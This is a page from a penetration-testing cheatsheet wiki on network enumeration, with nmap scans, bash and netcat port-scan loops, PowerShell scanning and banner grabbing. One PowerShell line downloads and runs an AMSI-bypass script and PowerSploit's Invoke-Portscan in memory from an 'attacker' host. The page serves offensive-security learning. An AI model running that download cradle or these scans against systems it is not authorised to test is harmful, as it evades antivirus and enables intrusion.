<head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Networking</title><link rel=stylesheet href=https://ceso.github.io/css/wiki.css></head><header><div id=brand><a class=icon-link href=https://ceso.github.io/><img class=icon src=https://ceso.github.io/images/site/logo.svg></a><div class=text><a href=https://ceso.github.io/ class=site-title>Ceso Adventures</a><h3>Blogs, Security CTFs & Tutorials</h3></div></div><nav><a href=https://ceso.github.io/><b>Home</b></a>
|
<a href=https://ceso.github.io/whoami/><b>Whoami</b></a>
|
<a href=https://ceso.github.io/posts/><b>Posts</b></a>
|
<a href=https://ceso.github.io/cheatsheets/><b>Cheatsheets</b></a>
|
<a href=https://ceso.github.io/resources><b>Resources</b></a>
|
<a href=https://ceso.github.io/videos><b>Videos</b></a>
|
<a href=https://ceso.github.io/categories/><b>Categories</b></a>
|
<a href=https://ceso.github.io/tags/><b>Tags</b></a>
|
<a href=https://ceso.github.io/index.xml><b>RSS</b></a></nav><hr></header><div class=wrap><nav class=sidebar aria-label="Table of contents"><h2>Cheatsheets</h2><details open><summary>Hacking</summary><div class=children><details><summary>Active Directory</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/active_directory/bloodhound/>BloodHound
</a><a href=https://ceso.github.io/cheatsheets/hacking/active_directory/exploitation/>Exploitation
</a><a href=https://ceso.github.io/cheatsheets/hacking/active_directory/permissions/>Permissions: ACE/SDDL - Format
</a><a href=https://ceso.github.io/cheatsheets/hacking/active_directory/powerview/>PowerView - methods for enumeration</a></div></details><details><summary>Antivirus Bypassing</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/antivirus_bypassing/readme/>README !
</a><a href=https://ceso.github.io/cheatsheets/hacking/antivirus_bypassing/amsi/>AMSI
</a><a href=https://ceso.github.io/cheatsheets/hacking/antivirus_bypassing/signature_heuristics/>Signature/Heuristics</a></div></details><details open><summary>Enumeration</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/enumeration/login_cifs_winrm_pssesion/>Login through CIFS/WinRM/PSSession
</a><a href=https://ceso.github.io/cheatsheets/hacking/enumeration/networking/ class=current>Networking
</a><a href=https://ceso.github.io/cheatsheets/hacking/enumeration/samba/>Samba
</a><a href=https://ceso.github.io/cheatsheets/hacking/enumeration/useful_wordlists/>Useful Wordlists
</a><a href=https://ceso.github.io/cheatsheets/hacking/enumeration/web_directorie_file_scanner/>Web directorie/file scanner
</a><a href=https://ceso.github.io/cheatsheets/hacking/enumeration/windows/>Windows</a></div></details><details><summary>Exfiltration</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/exfiltration/ftp/>FTP
</a><a href=https://ceso.github.io/cheatsheets/hacking/exfiltration/http/>HTTP
</a><a href=https://ceso.github.io/cheatsheets/hacking/exfiltration/rdp/>RDP
</a><a href=https://ceso.github.io/cheatsheets/hacking/exfiltration/samba/>Samba
</a><a href=https://ceso.github.io/cheatsheets/hacking/exfiltration/sockets/>Sockets</a></div></details><details><summary>Good to know</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/good_to_know/compiling/>Compiling
</a><a href=https://ceso.github.io/cheatsheets/hacking/good_to_know/misc/>Misc
</a><a href=https://ceso.github.io/cheatsheets/hacking/good_to_know/web/>Web</a></div></details><details><summary>Memory Exploitation</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/memory_exploitation/simple_buffer_overflow/>(Simple) Buffer Overflow (32 bits, NO ASLR and NO DEP)</a></div></details><details><summary>Pivoting</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/pivoting/readme/>README !
</a><a href=https://ceso.github.io/cheatsheets/hacking/pivoting/chisel/>Chisel
</a><a href=https://ceso.github.io/cheatsheets/hacking/pivoting/metasploit/>Metasploit
</a><a href=https://ceso.github.io/cheatsheets/hacking/pivoting/sshuttle/>sshuttle</a></div></details><details><summary>Privilege Escalation</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/privilege_escalation/linux/>Linux
</a><a href=https://ceso.github.io/cheatsheets/hacking/privilege_escalation/windows/>Windows</a></div></details><details><summary>Reverse Shells</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/reverse_shellls/bash/>Bash
</a><a href=https://ceso.github.io/cheatsheets/hacking/reverse_shellls/metasploit/>Metasploit
</a><a href=https://ceso.github.io/cheatsheets/hacking/reverse_shellls/php/>PHP</a></div></details></div></details><hr style="border:none;border-top:1px solid rgba(255,255,255,3%);margin:12px 0"><div style=padding:8px;color:#9aa4b2;font-size:13px>I wuv cheese :D</div></nav><main><header class=page-title><h1>Networking</h1></header><article><h1 id=nmap>nmap</h1><p>I tend to run 3 nmaps, an initial one, a full one and an UDP one, all of them in parallel:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>nmap -sV -O --top-ports 50 --open -oA nmap/initial &lt;ip or cidr&gt;
</span></span><span style=display:flex><span>nmap -sC -sV -O --open -p- -oA nmap/full &lt;ip or cidr&gt;
</span></span><span style=display:flex><span>nmap -sU -p- -oA nmap/udp &lt;ip or cidr&gt;
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>--top-ports only scan the N most common ports
</span></span><span style=display:flex><span>--open only show open ports
</span></span><span style=display:flex><span>-sC use the default scripts
</span></span><span style=display:flex><span>-sV detect versions
</span></span><span style=display:flex><span>-O detect Operating Systems
</span></span><span style=display:flex><span>-p- scan all the ports
</span></span><span style=display:flex><span>-oA save the output in normal format, grepable and xml
</span></span><span style=display:flex><span>-sU scan UDP ports
</span></span></code></pre></div><p>Is also possible to specify scripts or ports:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>nmap --scripts vuln,safe,discovery -p 443,80 &lt;ip or cidr&gt;
</span></span></code></pre></div><p>If there are servers that could be not answering (ping), then add the flag -Pn (example of initial one):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>nmap -Pn --top-ports 50 --open -oA nmap/initial &lt;ip or cidr&gt;
</span></span></code></pre></div><hr><h1 id=ports-discovery-without-nmap>Ports discovery (without nmap)</h1><h2 id=nc--bash>nc + bash</h2><p>If you get in a machine that doesn&rsquo;t have nmap installed, you can do a basic discovery of (for example), top 10 ports open in 192.168.30 by doing:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>top10<span style=color:#f92672>=(</span><span style=color:#ae81ff>20</span> <span style=color:#ae81ff>21</span> <span style=color:#ae81ff>22</span> <span style=color:#ae81ff>23</span> <span style=color:#ae81ff>25</span> <span style=color:#ae81ff>80</span> <span style=color:#ae81ff>110</span> <span style=color:#ae81ff>139</span> <span style=color:#ae81ff>443</span> <span style=color:#ae81ff>445</span> 3389<span style=color:#f92672>)</span>; <span style=color:#66d9ef>for</span> i in <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>${</span>top10[@]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>; <span style=color:#66d9ef>do</span> nc -w <span style=color:#ae81ff>1</span> 192.168.30.253 $i <span style=color:#f92672>&amp;&amp;</span> echo <span style=color:#e6db74>&#34;Port </span>$i<span style=color:#e6db74> is open&#34;</span> <span style=color:#f92672>||</span> echo <span style=color:#e6db74>&#34;Port </span>$i<span style=color:#e6db74> is closed or filtered&#34;</span>; <span style=color:#66d9ef>done</span>
</span></span></code></pre></div><h2 id=devtcpipport-or-devudpipport>/dev/tcp/ip/port or /dev/udp/ip/port</h2><p>Alternatively, is possible to do the same than above but by using the special dev files <code>/dev/tcp/ip/port</code> or <code>/dev/udp/ip/port</code> (for example nc is not found):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>top10<span style=color:#f92672>=(</span><span style=color:#ae81ff>20</span> <span style=color:#ae81ff>21</span> <span style=color:#ae81ff>22</span> <span style=color:#ae81ff>23</span> <span style=color:#ae81ff>25</span> <span style=color:#ae81ff>80</span> <span style=color:#ae81ff>110</span> <span style=color:#ae81ff>139</span> <span style=color:#ae81ff>443</span> <span style=color:#ae81ff>445</span> 3389<span style=color:#f92672>)</span>; <span style=color:#66d9ef>for</span> i in <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>${</span>top10[@]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>; <span style=color:#66d9ef>do</span> <span style=color:#f92672>(</span>echo &gt; /dev/tcp/192.168.30.253/<span style=color:#e6db74>&#34;</span>$i<span style=color:#e6db74>&#34;</span><span style=color:#f92672>)</span> &gt; /dev/null 2&gt;&amp;<span style=color:#ae81ff>1</span> <span style=color:#f92672>&amp;&amp;</span> echo <span style=color:#e6db74>&#34;Port </span>$i<span style=color:#e6db74> is open&#34;</span> <span style=color:#f92672>||</span> echo <span style=color:#e6db74>&#34;Port </span>$i<span style=color:#e6db74> is closed&#34;</span>; <span style=color:#66d9ef>done</span>
</span></span></code></pre></div><p>Taking these last examples, is straightforward to create a dummy script for scan a hole /24 net (for example):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>subnet<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;192.168.30&#34;</span>
</span></span><span style=display:flex><span>top10<span style=color:#f92672>=(</span><span style=color:#ae81ff>20</span> <span style=color:#ae81ff>21</span> <span style=color:#ae81ff>22</span> <span style=color:#ae81ff>23</span> <span style=color:#ae81ff>25</span> <span style=color:#ae81ff>80</span> <span style=color:#ae81ff>110</span> <span style=color:#ae81ff>139</span> <span style=color:#ae81ff>443</span> <span style=color:#ae81ff>445</span> 3389<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> host in <span style=color:#f92672>{</span>1..255<span style=color:#f92672>}</span>; <span style=color:#66d9ef>do</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> port in <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>${</span>top10[@]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>; <span style=color:#66d9ef>do</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>(</span>echo &gt; /dev/tcp/<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>${</span>subnet<span style=color:#e6db74>}</span><span style=color:#e6db74>.</span><span style=color:#e6db74>${</span>host<span style=color:#e6db74>}</span><span style=color:#e6db74>/</span><span style=color:#e6db74>${</span>port<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>)</span> &gt; /dev/null 2&gt;&amp;<span style=color:#ae81ff>1</span> <span style=color:#f92672>&amp;&amp;</span> echo <span style=color:#e6db74>&#34;Host </span><span style=color:#e6db74>${</span>subnet<span style=color:#e6db74>}</span><span style=color:#e6db74>.</span><span style=color:#e6db74>${</span>host<span style=color:#e6db74>}</span><span style=color:#e6db74> has </span><span style=color:#e6db74>${</span>port<span style=color:#e6db74>}</span><span style=color:#e6db74> open&#34;</span> <span style=color:#f92672>||</span> echo <span style=color:#e6db74>&#34;Host </span><span style=color:#e6db74>${</span>subnet<span style=color:#e6db74>}</span><span style=color:#e6db74>.</span><span style=color:#e6db74>${</span>host<span style=color:#e6db74>}</span><span style=color:#e6db74> has </span><span style=color:#e6db74>${</span>port<span style=color:#e6db74>}</span><span style=color:#e6db74> closed&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>done</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
</span></span></code></pre></div><hr><h1 id=powershell>Powershell</h1><h2 id=by-using-invoke-portscan-powersploit>By using Invoke-PortScan (PowerSploit)</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$topports=<span style=color:#e6db74>&#34;50&#34;</span>;$target=<span style=color:#e6db74>&#34;192.168.42.43,192.168.42.44,172.16.44.42,172.16.1.1,172.16.255.253&#34;</span>;$attacker=<span style=color:#e6db74>&#34;192.168.42.42&#34;</span>;IEX(New-Object Net.Webclient).downloadString(<span style=color:#e6db74>&#34;http://</span>$attacker<span style=color:#e6db74>/4msibyp455.ps1&#34;</span>);IEX(New-Object Net.Webclient).downloadString(<span style=color:#e6db74>&#34;http://</span>$attacker<span style=color:#e6db74>/Invoke-Portscan.ps1&#34;</span>);Invoke-Portscan -Hosts <span style=color:#e6db74>&#34;</span>$target<span style=color:#e6db74>&#34;</span> -TopPorts <span style=color:#e6db74>&#34;</span>$topports<span style=color:#e6db74>&#34;</span>
</span></span></code></pre></div><h2 id=leverage-native-powershell>Leverage Native Powershell</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$target = <span style=color:#e6db74>&#39;192.168.42.42&#39;</span>;$scanPorts = @(<span style=color:#e6db74>&#39;80&#39;</span>, <span style=color:#e6db74>&#39;8080&#39;</span>, <span style=color:#e6db74>&#39;443&#39;</span>, <span style=color:#e6db74>&#39;8081&#39;</span>, <span style=color:#e6db74>&#39;3128&#39;</span>, <span style=color:#e6db74>&#39;25&#39;</span>, <span style=color:#e6db74>&#39;5985&#39;</span>, <span style=color:#e6db74>&#39;5986&#39;</span>, <span style=color:#e6db74>&#39;445&#39;</span>, <span style=color:#e6db74>&#39;139&#39;</span>); <span style=color:#66d9ef>foreach</span>($port <span style=color:#66d9ef>in</span> $scanPorts){Test-NetConnection -ComputerName $target -InformationLevel <span style=color:#e6db74>&#34;Quiet&#34;</span> -Port $port}
</span></span></code></pre></div><hr><h1 id=banner-grabbing-without-nmap>Banner grabbing (without nmap)</h1><p>If nmap didn&rsquo;t grab banners (or is not installed), you can do it with <code>/dev/tcp/ip/port</code> <code>/dev/udp/ip/port</code> or by using telnet.</p><h2 id=devtcpipport-or-devudpipport-1>/dev/tcp/ip/port or /dev/udp/ip/port</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>cat &lt; /dev/tcp/192.168.30.253/22
</span></span><span style=display:flex><span>SSH-2.0-OpenSSH_6.2p2 Debian-6
</span></span><span style=display:flex><span>^C pressed here
</span></span></code></pre></div><p>For doing it with udp ports is the same, but changing tcp for udp</p><h2 id=telnet>telnet</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>telnet 192.168.30.253 22
</span></span><span style=display:flex><span>SSH-2.0-OpenSSH_6.2p2 Debian-6
</span></span><span style=display:flex><span>^C pressed here
</span></span></code></pre></div><hr></article></main></div></body><footer><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link rel=stylesheet href=https://ceso.github.io/css/wiki.css></footer><footer><hr><p id=social>Find me around the web:<br><a href=https://github.com/ceso target=_blank>GitHub</a>
|
<a href=https://youtube.com/c/LeandroLemos target=_blank>YouTube</a>
|
<a href=https://twitch.tv/0xc350 target=_blank>Twitch</a></p><p class=copyright>Copyright © 2025
<a href=https://ceso.github.io/><strong>Ceso</strong></a>.</p><p class=builtWith>Built with
<a href=http://www.gohugo.io/>Hugo</a> by ceso,
using <a href=https://github.com/ceso/smigle-lagom>smigle-lagom</a> a fork of the theme
<a href=https://github.com/joe-mccarthy/smigle-lite>smigle-lite</a>. Based on the theme
<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>,
which was influenced by the theme
<a href=https://github.com/colorchestra/smol>smol</a>.</p></footer>